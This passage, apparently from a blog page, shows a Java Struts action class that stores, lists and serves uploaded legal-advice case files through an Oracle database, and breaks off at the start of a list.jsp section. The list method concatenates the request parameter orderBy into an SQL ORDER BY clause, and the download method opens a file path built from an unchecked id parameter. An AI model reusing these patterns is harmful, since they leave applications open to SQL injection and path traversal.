class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br></pre></td><td class="code"><pre><span class="line">import vo.CaseLegalAdvice;</span><br><span class="line">import vo.Chapter;</span><br><span class="line">import vo.Enactment;</span><br><span class="line">import vo.EnactmentView;</span><br><span class="line">import vo.LegalAdviceUpload;</span><br><span class="line">import vo.OffenseQuote;</span><br><span class="line"></span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.Serializable;</span><br><span class="line">import java.sql.Connection;</span><br><span class="line">import java.sql.Date;</span><br><span class="line">import java.sql.PreparedStatement;</span><br><span class="line">import java.sql.ResultSet;</span><br><span class="line">import java.sql.Statement;</span><br><span class="line">import java.sql.Timestamp;</span><br><span class="line">import java.text.SimpleDateFormat;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.Iterator;</span><br><span class="line">import java.util.List;</span><br><span class="line">import java.util.Locale;</span><br><span class="line">import java.util.ResourceBundle;</span><br><span class="line">import java.util.StringTokenizer;</span><br><span class="line"></span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.fileupload.DiskFileUpload;</span><br><span class="line">import org.apache.commons.fileupload.FileItem;</span><br><span class="line">import org.apache.oro.text.regex.MatchResult;</span><br><span class="line">import org.apache.oro.text.regex.Pattern;</span><br><span class="line">import org.apache.oro.text.regex.PatternCompiler;</span><br><span class="line">import org.apache.oro.text.regex.PatternMatcher;</span><br><span class="line">import org.apache.oro.text.regex.Perl5Compiler;</span><br><span class="line">import org.apache.oro.text.regex.Perl5Matcher;</span><br><span class="line">import org.apache.struts.action.ActionForm;</span><br><span class="line">import org.apache.struts.action.ActionForward;</span><br><span class="line">import org.apache.struts.action.ActionMapping;</span><br><span class="line">import org.apache.struts.actions.DispatchAction;</span><br><span class="line"></span><br><span class="line">import xx.utils.DbManager;</span><br><span class="line"></span><br><span class="line">public class LegalAdviceAction extends DispatchAction &#123;</span><br><span class="line">  final ResourceBundle uploadSetting = ResourceBundle</span><br><span class="line">      .getBundle(&quot;xx.properties.uploadSettings&quot;);</span><br><span class="line"></span><br><span class="line">  public ActionForward save(ActionMapping mapping, ActionForm form,</span><br><span class="line">      HttpServletRequest request, HttpServletResponse response)</span><br><span class="line">      throws Exception &#123;</span><br><span class="line"></span><br><span class="line">    final SimpleDateFormat sf = new SimpleDateFormat(&quot;dd/MM/yyyy&quot;,</span><br><span class="line">        Locale.ENGLISH);</span><br><span class="line"></span><br><span class="line">    final String savePath = uploadSetting</span><br><span class="line">        .getString(&quot;upload.dir.prosecutions&quot;);</span><br><span class="line"></span><br><span class="line">    String fileNo = &quot;&quot;;</span><br><span class="line">    String subject = &quot;&quot;;</span><br><span class="line">    String legalAdviceStatus = &quot;&quot;;</span><br><span class="line">    String legalAdviceRemarks = &quot;&quot;;</span><br><span class="line">    String legalAdviceDate = &quot;&quot;;</span><br><span class="line">    String authRefInd = &quot;&quot;;</span><br><span class="line">    String authRef = &quot;&quot;;</span><br><span class="line">    String defendant = &quot;&quot;;</span><br><span class="line">    String defendantEmployer = &quot;&quot;;</span><br><span class="line">    String defendantEmployee = &quot;&quot;;</span><br><span class="line">    String ordinance = &quot;&quot;;</span><br><span class="line">    String keepFileNos = &quot;&quot;;</span><br><span class="line">    List fileContent = new ArrayList();</span><br><span class="line"></span><br><span class="line">    List keepFileNosList = new ArrayList();</span><br><span class="line">    List uploadFileList = new ArrayList();</span><br><span class="line">    String reqCode = &quot;&quot;;</span><br><span class="line">    String caseNo = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    final Timestamp now = new Timestamp(new java.util.Date().getTime());</span><br><span class="line">    String login_id = (String) request.getSession()</span><br><span class="line">        .getAttribute(&quot;login_id&quot;);</span><br><span class="line"></span><br><span class="line">    final DiskFileUpload upload = new DiskFileUpload();</span><br><span class="line">    final List list = upload.parseRequest(request);</span><br><span class="line">    final Iterator it = list.iterator();</span><br><span class="line">    while (it.hasNext()) &#123;</span><br><span class="line">      final FileItem item = (FileItem) it.next();</span><br><span class="line">      if (item.isFormField()) &#123;</span><br><span class="line">        if (getParamter(item, &quot;subject&quot;)) &#123;</span><br><span class="line">          subject = item.getString();</span><br><span class="line">        &#125; else if (getParamter(item, &quot;ordinance&quot;)) &#123;</span><br><span class="line">          ordinance = item.getString();</span><br><span class="line">        &#125; else if (getParamter(item, &quot;legalAdviceDate&quot;)) &#123;</span><br><span class="line">          legalAdviceDate = item.getString();</span><br><span class="line">        &#125; else if (getParamter(item, &quot;legalAdviceStatus&quot;)) &#123;</span><br><span class="line">          if (&quot;a&quot;.equals(item.getString())) &#123;</span><br><span class="line">            legalAdviceStatus = &quot;Accepted&quot;;</span><br><span class="line">          &#125; else if (&quot;na&quot;.equals(item.getString())) &#123;</span><br><span class="line">            legalAdviceStatus = &quot;Not Accepted&quot;;</span><br><span class="line">          &#125; else &#123;</span><br><span class="line">            legalAdviceStatus = &quot;Not Mentioned&quot;;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125; else if (getParamter(item, &quot;legalAdviceRemarks&quot;)) &#123;</span><br><span class="line">          legalAdviceRemarks = item.getString();</span><br><span class="line">        &#125; else if (getParamter(item, &quot;authRefInd&quot;)) &#123;</span><br><span class="line">          authRefInd = item.getString();</span><br><span class="line">        &#125; else if (getParamter(item, &quot;defendantEmployer&quot;)) &#123;</span><br><span class="line">          defendantEmployer = item.getString();</span><br><span class="line">        &#125; else if (getParamter(item, &quot;defendantEmployee&quot;)) &#123;</span><br><span class="line">          defendantEmployee = item.getString();</span><br><span class="line">        &#125; else if (getParamter(item, &quot;fileNo&quot;)) &#123;</span><br><span class="line">          fileNo = item.getString();</span><br><span class="line">        &#125; else if (getParamter(item, &quot;authRef&quot;)) &#123;</span><br><span class="line">          authRef = item.getString();</span><br><span class="line">        &#125; else if (getParamter(item, &quot;reqCode&quot;)) &#123;</span><br><span class="line">          reqCode = item.getString();</span><br><span class="line">        &#125; else if (getParamter(item, &quot;caseNo&quot;)) &#123;</span><br><span class="line">          caseNo = item.getString();</span><br><span class="line">        &#125; else if (getParamter(item, &quot;keepFileNos&quot;)) &#123;</span><br><span class="line">          keepFileNos = item.getString();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        String fileName = item.getName();</span><br><span class="line">        if (fileName != null &amp;&amp; fileName.length() &gt; 0) &#123;</span><br><span class="line">          if (fileName.indexOf(&quot;\\&quot;) != -1) &#123;</span><br><span class="line">            PatternCompiler compiler = new Perl5Compiler();</span><br><span class="line">            PatternMatcher matcher = new Perl5Matcher();</span><br><span class="line">            Pattern pattern = compiler.compile(&quot;^.+\\\\(.+)$&quot;);</span><br><span class="line">            if (matcher.matches(fileName, pattern)) &#123;</span><br><span class="line">              MatchResult ms = matcher.getMatch();</span><br><span class="line">              System.out</span><br><span class="line">                  .println(&quot;fileName full path &quot; + fileName);</span><br><span class="line">              fileName = ms.group(1);</span><br><span class="line">              System.out.println(&quot;fileName &quot; + fileName);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          uploadFileList.add(fileName);</span><br><span class="line">          fileContent.add(item);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (defendantEmployer.length() &gt; 0 &amp;&amp; defendantEmployee.length() &gt; 0) &#123;</span><br><span class="line">      defendant = defendantEmployer + &quot;/&quot; + defendantEmployee;</span><br><span class="line">    &#125; else if (defendantEmployer.length() &gt; 0) &#123;</span><br><span class="line">      defendant = defendantEmployer;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      defendant = defendantEmployee;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    System.out.println(&quot;caseNo &quot; + caseNo + &quot; , subject &quot; + subject</span><br><span class="line">        + &quot; ,legalAdviceDate &quot; + legalAdviceDate + &quot; , ordinance &quot;</span><br><span class="line">        + ordinance + &quot; , keepFileNos &quot; + keepFileNos);</span><br><span class="line"></span><br><span class="line">    final Connection conn = DbManager.getConnection();</span><br><span class="line"></span><br><span class="line">    if (&quot;edit&quot;.equals(reqCode)) &#123;</span><br><span class="line">      System.out.println(&quot;edit legail advice&quot;);</span><br><span class="line">      String sql = &quot;update case_legal_advice set offense_code = ?, file_no = ?, subject = ?, &quot;</span><br><span class="line">          + &quot;legal_advice_date = ?, legal_advice_status = ?, legal_advice_remarks = ?, &quot;</span><br><span class="line">          + &quot;defendant = ?, auth_ref_ind = ?, auth_ref = ?,&quot;</span><br><span class="line">          + &quot;last_update = ?, update_by = ? where case_seq_no = ?&quot;;</span><br><span class="line">      PreparedStatement ps = conn.prepareStatement(sql);</span><br><span class="line"></span><br><span class="line">      ps.setString(1, ordinance);</span><br><span class="line">      ps.setString(2, fileNo);</span><br><span class="line">      ps.setString(3, subject);</span><br><span class="line">      ps.setDate(4, new Date(sf.parse(legalAdviceDate).getTime()));</span><br><span class="line">      ps.setString(5, legalAdviceStatus);</span><br><span class="line">      ps.setString(6, legalAdviceRemarks);</span><br><span class="line">      ps.setString(7, defendant);</span><br><span class="line">      ps.setString(8, authRefInd);</span><br><span class="line">      ps.setString(9, authRef);</span><br><span class="line"></span><br><span class="line">      ps.setTimestamp(10, now);</span><br><span class="line">      ps.setString(11, login_id);</span><br><span class="line">      ps.setInt(12, Integer.parseInt(caseNo));</span><br><span class="line"></span><br><span class="line">      ps.executeUpdate();</span><br><span class="line">      ps.close();</span><br><span class="line"></span><br><span class="line">      StringTokenizer st = new StringTokenizer(keepFileNos, &quot;|&quot;);</span><br><span class="line">      while (st.hasMoreTokens()) &#123;</span><br><span class="line">        String token = st.nextToken();</span><br><span class="line">        System.out.println(&quot;keep file No. &quot; + token);</span><br><span class="line">        keepFileNosList.add(token);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      String fileSql = &quot;select upload_seq_no, file_name from legal_advice_upload where case_seq_no = ? order by upload_seq_no&quot;;</span><br><span class="line">      System.out.println(&quot;fileSql  &quot; + fileSql);</span><br><span class="line">      ps = conn.prepareStatement(fileSql);</span><br><span class="line">      ps.setString(1, caseNo);</span><br><span class="line">      ResultSet rs = ps.executeQuery();</span><br><span class="line"></span><br><span class="line">      List toDeleteFilesNo = new ArrayList();</span><br><span class="line">      while (rs.next()) &#123;</span><br><span class="line">        String upload_seq_no = rs.getString(&quot;upload_seq_no&quot;);</span><br><span class="line">        String file = rs.getString(&quot;file_name&quot;);</span><br><span class="line"></span><br><span class="line">        if (!keepFileNosList.contains(upload_seq_no)) &#123;</span><br><span class="line">          toDeleteFilesNo.add(upload_seq_no);</span><br><span class="line">          if (new File(savePath + file).delete()) &#123;</span><br><span class="line">            System.out.println(&quot;file &quot; + file + &quot; is deleted.&quot;);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      rs.close();</span><br><span class="line">      ps.close();</span><br><span class="line"></span><br><span class="line">      Iterator delItr = toDeleteFilesNo.iterator();</span><br><span class="line">      String deleteFileSql = &quot;delete legal_advice_upload where upload_seq_no = ?&quot;;</span><br><span class="line">      ps = conn.prepareStatement(deleteFileSql);</span><br><span class="line">      while (delItr.hasNext()) &#123;</span><br><span class="line">        String uploadNo = (String) delItr.next();</span><br><span class="line">        ps.setString(1, uploadNo);</span><br><span class="line">        ps.executeUpdate();</span><br><span class="line">      &#125;</span><br><span class="line">      ps.close();</span><br><span class="line"></span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      System.out.println(&quot;add legail advice.&quot;);</span><br><span class="line">      int seq = 0;</span><br><span class="line">      Statement stmt = conn.createStatement();</span><br><span class="line">      ResultSet rs = stmt</span><br><span class="line">          .executeQuery(&quot;select case_legal_advice_SQ.nextval as seq from dual&quot;);</span><br><span class="line"></span><br><span class="line">      while (rs.next()) &#123;</span><br><span class="line">        seq = rs.getInt(&quot;seq&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      rs.close();</span><br><span class="line">      stmt.close();</span><br><span class="line"></span><br><span class="line">      System.out.println(&quot;case_legal_advice_SQ &quot; + seq);</span><br><span class="line">      caseNo = String.valueOf(seq);</span><br><span class="line">      String sql = &quot;insert into case_legal_advice(case_seq_no, offense_code, file_no, subject, legal_advice_date, &quot;</span><br><span class="line">          + &quot;legal_advice_status, legal_advice_remarks, defendant, auth_ref_ind, auth_ref, &quot;</span><br><span class="line">          + &quot;last_update, update_by) values(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)&quot;;</span><br><span class="line">      final PreparedStatement ps = conn.prepareStatement(sql);</span><br><span class="line"></span><br><span class="line">      ps.setInt(1, seq);</span><br><span class="line">      ps.setString(2, ordinance);</span><br><span class="line">      ps.setString(3, fileNo);</span><br><span class="line">      ps.setString(4, subject);</span><br><span class="line">      ps.setDate(5, new Date(sf.parse(legalAdviceDate).getTime()));</span><br><span class="line">      ps.setString(6, legalAdviceStatus);</span><br><span class="line">      ps.setString(7, legalAdviceRemarks);</span><br><span class="line">      ps.setString(8, defendant);</span><br><span class="line">      ps.setString(9, authRefInd);</span><br><span class="line">      ps.setString(10, authRef);</span><br><span class="line"></span><br><span class="line">      ps.setTimestamp(11, now);</span><br><span class="line">      ps.setString(12, login_id);</span><br><span class="line"></span><br><span class="line">      ps.executeUpdate();</span><br><span class="line">      ps.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Iterator itr = uploadFileList.iterator();</span><br><span class="line">    int i = 0;</span><br><span class="line">    while (itr.hasNext()) &#123;</span><br><span class="line">      String fileName = (String) itr.next();</span><br><span class="line">      int uploadReq = 0;</span><br><span class="line">      Statement stmt2 = conn.createStatement();</span><br><span class="line">      ResultSet rs2 = stmt2</span><br><span class="line">          .executeQuery(&quot;select legal_advice_upload_SQ.nextval as seq from dual&quot;);</span><br><span class="line"></span><br><span class="line">      while (rs2.next()) &#123;</span><br><span class="line">        uploadReq = rs2.getInt(&quot;seq&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      rs2.close();</span><br><span class="line">      stmt2.close();</span><br><span class="line">      System.out.println(&quot;legal_advice_upload_SQ &quot; + uploadReq);</span><br><span class="line"></span><br><span class="line">      String sql2 = &quot;insert into legal_advice_upload (upload_seq_no, case_seq_no, file_name, last_update, update_by) values(?, ?, ?, ?, ?)&quot;;</span><br><span class="line">      PreparedStatement ps2 = conn.prepareStatement(sql2);</span><br><span class="line">      ps2.setInt(1, uploadReq);</span><br><span class="line">      ps2.setInt(2, Integer.parseInt(caseNo));</span><br><span class="line">      ps2.setString(3, fileName);</span><br><span class="line">      ps2.setTimestamp(4, now);</span><br><span class="line">      ps2.setString(5, login_id);</span><br><span class="line">      ps2.executeUpdate();</span><br><span class="line">      ps2.close();</span><br><span class="line"></span><br><span class="line">      FileItem item = (FileItem) fileContent.get(i);</span><br><span class="line"></span><br><span class="line">      System.out.println(&quot;save file &quot; + fileName + &quot; =&gt; &quot; + savePath</span><br><span class="line">          + String.valueOf(uploadReq));</span><br><span class="line">      item.write(new File(savePath + String.valueOf(uploadReq)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return mapping.findForward(&quot;redirectList&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  private boolean getParamter(FileItem item, String paramName) &#123;</span><br><span class="line">    if (item.getString() != null &amp;&amp; item.getFieldName().equals(paramName)) &#123;</span><br><span class="line">      return true;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public ActionForward list(ActionMapping mapping, ActionForm form,</span><br><span class="line">      HttpServletRequest request, HttpServletResponse response)</span><br><span class="line">      throws Exception &#123;</span><br><span class="line">    String orderBy = request.getParameter(&quot;orderBy&quot;);</span><br><span class="line">    System.out.println(&quot;orderBy &quot; + orderBy);</span><br><span class="line"></span><br><span class="line">    Object lastFieldSort = request.getSession().getAttribute(</span><br><span class="line">        &quot;lastFieldSort&quot;);</span><br><span class="line">    FieldSort fieldSort = null;</span><br><span class="line"></span><br><span class="line">    if (lastFieldSort == null) &#123;</span><br><span class="line">      fieldSort = new FieldSort();</span><br><span class="line">      fieldSort.setSortBy(orderBy);</span><br><span class="line">      fieldSort.setAsc(Boolean.TRUE);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      fieldSort = (FieldSort) lastFieldSort;</span><br><span class="line"></span><br><span class="line">      if (fieldSort.getSortBy() != null</span><br><span class="line">          &amp;&amp; fieldSort.getSortBy().equals(orderBy)) &#123;</span><br><span class="line">        if (fieldSort.getAsc().equals(Boolean.TRUE)) &#123;</span><br><span class="line">          fieldSort.setAsc(Boolean.FALSE);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">          fieldSort.setAsc(Boolean.TRUE);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        fieldSort.setSortBy(orderBy);</span><br><span class="line">        fieldSort.setAsc(Boolean.TRUE);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    final Connection conn = DbManager.getConnection();</span><br><span class="line"></span><br><span class="line">    Statement stmt = conn.createStatement();</span><br><span class="line">    String sql = &quot;select e.enact_Chap, e.title, c.chapter, o.sect_reg, o.description, cla.case_seq_no, cla.file_no, cla.subject, &quot;</span><br><span class="line">        + &quot;cla.legal_advice_date, cla.legal_advice_status, cla.defendant, cla.auth_ref_ind, cla.auth_ref, u.upload_seq_no, u.file_name &quot;</span><br><span class="line">        + &quot;from Enactment e, Chapter c, offense_quote o, case_legal_advice cla, legal_advice_upload u &quot;</span><br><span class="line">        + &quot;where e.enact_chap = c.enact_chap and c.Chapter = o.Chapter and o.offense_code = cla.offense_code(+) and &quot;</span><br><span class="line">        + &quot;cla.case_seq_no = u.case_seq_no(+)&quot;;</span><br><span class="line">    if (orderBy != null &amp;&amp; orderBy.length() &gt; 0) &#123;</span><br><span class="line">      sql += &quot; order by &quot;</span><br><span class="line">          + fieldSort.getSortBy()</span><br><span class="line">          + (fieldSort.getAsc().equals(Boolean.TRUE) ? &quot; asc&quot;</span><br><span class="line">              : &quot; desc&quot;) + &quot;, cla.file_no&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      sql += &quot; order by c.Chapter, cla.file_no&quot;;</span><br><span class="line">      orderBy = &quot;c.chapter&quot;;</span><br><span class="line">      fieldSort = new FieldSort();</span><br><span class="line">      fieldSort.setSortBy(orderBy);</span><br><span class="line">      fieldSort.setAsc(Boolean.TRUE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    request.getSession().setAttribute(&quot;lastFieldSort&quot;, fieldSort);</span><br><span class="line"></span><br><span class="line">    System.out.println(&quot;sql = &quot; + sql);</span><br><span class="line">    ResultSet rs = stmt.executeQuery(sql);</span><br><span class="line">    List list = new ArrayList();</span><br><span class="line">    while (rs.next()) &#123;</span><br><span class="line">      EnactmentView view = new EnactmentView();</span><br><span class="line">      Enactment enactment = new Enactment();</span><br><span class="line">      Chapter chapter = new Chapter();</span><br><span class="line">      </span><br><span class="line">      ...</span><br><span class="line">      String enactChap = rs.getString(&quot;enact_Chap&quot;);</span><br><span class="line">      String title = rs.getString(&quot;title&quot;);</span><br><span class="line">      String chapterValue = rs.getString(&quot;chapter&quot;);</span><br><span class="line">      ...</span><br><span class="line"></span><br><span class="line">      list.add(view);</span><br><span class="line">    &#125;</span><br><span class="line">    rs.close();</span><br><span class="line">    stmt.close();</span><br><span class="line"></span><br><span class="line">    request.setAttribute(&quot;list&quot;, list);</span><br><span class="line">    request.setAttribute(&quot;sortBy&quot;, fieldSort.getSortBy());</span><br><span class="line">    if (fieldSort.getAsc().equals(Boolean.FALSE)) &#123;</span><br><span class="line">      request.setAttribute(&quot;order&quot;, &quot;down&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      request.setAttribute(&quot;order&quot;, &quot;up&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String savePath = uploadSetting.getString(&quot;upload.dir.prosecutions&quot;);</span><br><span class="line">    request.setAttribute(&quot;savePath&quot;, savePath);</span><br><span class="line"></span><br><span class="line">    return mapping.findForward(&quot;list&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public ActionForward download(ActionMapping mapping, ActionForm form,</span><br><span class="line">      HttpServletRequest request, HttpServletResponse response)</span><br><span class="line">      throws Exception &#123;</span><br><span class="line">    String id = request.getParameter(&quot;id&quot;);</span><br><span class="line">    String fileName = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    final Connection conn = DbManager.getConnection();</span><br><span class="line">    String sql = &quot;select file_name from legal_advice_upload where upload_seq_no = ?&quot;;</span><br><span class="line">    PreparedStatement ps = conn.prepareStatement(sql);</span><br><span class="line">    ps.setString(1, id);</span><br><span class="line">    ResultSet rs = ps.executeQuery();</span><br><span class="line"></span><br><span class="line">    if (rs.next()) &#123;</span><br><span class="line">      fileName = rs.getString(&quot;file_name&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    rs.close();</span><br><span class="line">    ps.close();</span><br><span class="line"></span><br><span class="line">    System.out.println(&quot;download file : &quot; + fileName);</span><br><span class="line">    String savePath = uploadSetting.getString(&quot;upload.dir.prosecutions&quot;);</span><br><span class="line">    FileInputStream in = new FileInputStream(savePath + &quot;/&quot; + id);</span><br><span class="line">    byte[] buffer = new byte[8092];</span><br><span class="line">    int i = 0;</span><br><span class="line">    response.setContentType(&quot;application/octet-stream&quot;);</span><br><span class="line">    response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment; filename=\&quot;&quot;</span><br><span class="line">        + new String(fileName.getBytes(&quot;UTF-8&quot;), &quot;ISO_8859_1&quot;) + &quot;\&quot;&quot;);</span><br><span class="line"></span><br><span class="line">    while ((i = in.read(buffer)) != -1) &#123;</span><br><span class="line">      response.getOutputStream().write(buffer, 0, i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    response.getOutputStream().flush();</span><br><span class="line">    return null;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class FieldSort implements Serializable &#123;</span><br><span class="line">  private String sortBy;</span><br><span class="line">  private Boolean asc;</span><br><span class="line"></span><br><span class="line">  public String getSortBy() &#123;</span><br><span class="line">    return sortBy;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public void setSortBy(String sortBy) &#123;</span><br><span class="line">    this.sortBy = sortBy;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public Boolean getAsc() &#123;</span><br><span class="line">    return asc;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public void setAsc(Boolean asc) &#123;</span><br><span class="line">    this.asc = asc;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="list-jsp-sort-cell-merge"><a href="#list-jsp-sort-cell-merge" class="headerlink" title="list.jsp (sort, cell merge)"></a>list.jsp (sort, cell merge)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span 